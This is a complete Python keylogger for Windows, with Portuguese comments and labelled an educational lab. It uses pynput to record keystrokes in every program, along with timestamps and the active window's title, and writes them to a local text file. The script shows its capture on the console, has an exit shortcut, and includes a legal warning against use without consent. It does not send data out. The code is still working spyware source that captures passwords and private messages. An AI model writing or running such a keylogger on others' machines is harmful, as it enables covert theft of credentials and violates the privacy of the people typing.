"""
KEYLOGGER GLOBAL - LABORATORIO EDUCACIONAL
==========================================
Captura as teclas digitadas em QUALQUER programa do Windows
(Word, Bloco de Notas, navegador etc.) e grava em registro_teclas.txt,
na mesma pasta deste script.

Requisitos:
    pip install pynput

Como usar:
    python registro_simulado.py
    -> digite normalmente em qualquer programa;
    -> para ENCERRAR, use Ctrl + Alt + Esc (ou feche a janela do terminal).

Formato do registro:
    - Cada "rajada" de digitacao comeca em nova linha, com data/hora
      e o titulo da janela ativa, ex.:
      [07/11/2026 10:00:12] (Sem titulo - Bloco de notas) ola mundo
    - Teclas especiais aparecem entre colchetes: [BACKSPACE], [F5], [UP]...
    - Um marcador indica o inicio e o fim de cada sessao.

AVISO (uso responsavel):
    Use apenas no SEU computador ou com autorizacao expressa do responsavel.
    Capturar teclas de terceiros sem consentimento e crime
    (art. 154-A do Codigo Penal brasileiro - invasao de dispositivo informatico).
"""

from datetime import datetime
from pathlib import Path
import ctypes
import os
import time

try:
    from pynput import keyboard
except ImportError:
    print("Biblioteca 'pynput' nao encontrada.")
    print("Instale com o comando: pip install pynput")
    raise SystemExit(1)

# ============================================================
# CONFIGURACAO
# ============================================================

# Arquivo de registro (na mesma pasta do script)
ARQUIVO_LOG = Path(__file__).parent / "registro_teclas.txt"

# Inatividade (em segundos) necessaria para comecar nova linha com horario
PAUSA_PARA_NOVO_HORARIO = 10

# Teclas especiais traduzidas para texto comum no arquivo
TECLAS_TRADUZIDAS = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t",
}

# Variantes possiveis das teclas modificadoras
TECLAS_CTRL = {keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r}
TECLAS_ALT = {keyboard.Key.alt, keyboard.Key.alt_l, keyboard.Key.alt_r}
TECLAS_SHIFT = {keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r}

# ============================================================
# ESTADO DO PROGRAMA
# ============================================================
ctrl_ativo = False        # Ctrl esta pressionado neste momento?
alt_ativo = False         # Alt esta pressionado neste momento?
shift_ativo = False       # Shift esta pressionado neste momento?
ultimo_evento = 0.0       # Momento da ultima tecla gravada
ultimo_caractere = "\n"   # Ultimo caractere gravado no arquivo


def titulo_janela_ativa():
    """Retorna o titulo da janela em primeiro plano (somente Windows)."""
    if os.name != "nt":
        return "Desconhecida"
    try:
        usuario32 = ctypes.windll.user32
        janela = usuario32.GetForegroundWindow()
        tamanho = usuario32.GetWindowTextLengthW(janela)
        if tamanho == 0:
            return "Desconhecida"
        buffer_texto = ctypes.create_unicode_buffer(tamanho + 1)
        usuario32.GetWindowTextW(janela, buffer_texto, tamanho + 1)
        return buffer_texto.value
    except Exception:
        return "Desconhecida"


def registrar_texto(texto):
    """Grava texto no log, inserindo data/hora e janela ativa apos pausas."""
    global ultimo_evento, ultimo_caractere

    agora = time.time()
    novo_bloco = (agora - ultimo_evento) > PAUSA_PARA_NOVO_HORARIO
    ultimo_evento = agora

    with ARQUIVO_LOG.open("a", encoding="utf-8") as arquivo:
        if novo_bloco:
            horario = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
            janela = titulo_janela_ativa()
            prefixo = "\n" if ultimo_caractere != "\n" else ""
            arquivo.write(f"{prefixo}[{horario}] ({janela}) ")
            # Feedback do novo bloco tambem no console
            print(f"\n[{horario} | {janela}] ", end="", flush=True)
        arquivo.write(texto)

    ultimo_caractere = texto[-1]


def tecla_para_texto(tecla):
    """Converte o evento de tecla do pynput em texto legivel."""
    # 1) Teclas traduzidas (espaco, enter, tab)
    if tecla in TECLAS_TRADUZIDAS:
        return TECLAS_TRADUZIDAS[tecla]

    # 2) Teclas que geram caractere (letras, numeros, simbolos)
    caractere = getattr(tecla, "char", None)
    if caractere:
        # Garante maiuscula quando Shift estava pressionado
        return caractere.upper() if shift_ativo else caractere

    # 3) Demais teclas: usa o nome oficial entre colchetes
    nome = getattr(tecla, "name", "DESCONHECIDA")
    return f"[{nome.upper()}]"


def ao_pressionar(tecla):
    """Callback disparada a cada tecla pressionada em QUALQUER programa."""
    global ctrl_ativo, alt_ativo, shift_ativo

    # Atualiza o estado dos modificadores
    if tecla in TECLAS_CTRL:
        ctrl_ativo = True
    if tecla in TECLAS_ALT:
        alt_ativo = True
    if tecla in TECLAS_SHIFT:
        shift_ativo = True

    # Combinacao de encerramento: Ctrl + Alt + Esc
    if ctrl_ativo and alt_ativo and tecla == keyboard.Key.esc:
        print("\n[OK] Encerrando pelo atalho Ctrl + Alt + Esc...")
        return False  # Encerra o listener do pynput

    # (Opcional) para NAO registrar modificadores no log, descomente:
    # if tecla in TECLAS_CTRL | TECLAS_ALT | TECLAS_SHIFT:
    #     return None

    texto = tecla_para_texto(tecla)
    registrar_texto(texto)

    # Feedback ao vivo no console
    print(texto.replace("\n", "\\n"), end="", flush=True)


def ao_soltar(tecla):
    """Callback disparada a cada tecla solta (atualiza modificadores)."""
    global ctrl_ativo, alt_ativo, shift_ativo

    if tecla in TECLAS_CTRL:
        ctrl_ativo = False
    if tecla in TECLAS_ALT:
        alt_ativo = False
    if tecla in TECLAS_SHIFT:
        shift_ativo = False


def gravar_marcador(nome_marcador):
    """Escreve um marcador de sessao (inicio/fim) no arquivo."""
    global ultimo_caractere
    horario = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    with ARQUIVO_LOG.open("a", encoding="utf-8") as arquivo:
        arquivo.write(f"\n{'=' * 40}\n")
        arquivo.write(f"[{nome_marcador} EM {horario}]\n")
        arquivo.write(f"{'=' * 40}\n")
    ultimo_caractere = "\n"


def main():
    print("=" * 50)
    print("KEYLOGGER GLOBAL - LABORATORIO EDUCACIONAL")
    print("=" * 50)
    print(f"Arquivo de log : {ARQUIVO_LOG}")
    print("Capturando teclas de QUALQUER programa do Windows.")
    print("Para ENCERRAR : Ctrl + Alt + Esc")
    print("-" * 50)

    gravar_marcador("SESSAO INICIADA")

    # Listener global: fica ativo ate uma callback retornar False
    try:
        with keyboard.Listener(on_press=ao_pressionar, on_release=ao_soltar) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\n[OK] Interrompido pelo usuario (Ctrl+C).")

    gravar_marcador("SESSAO ENCERRADA")
    print(f"\n[OK] Registros salvos em: {ARQUIVO_LOG}")


if __name__ == "__main__":
    main()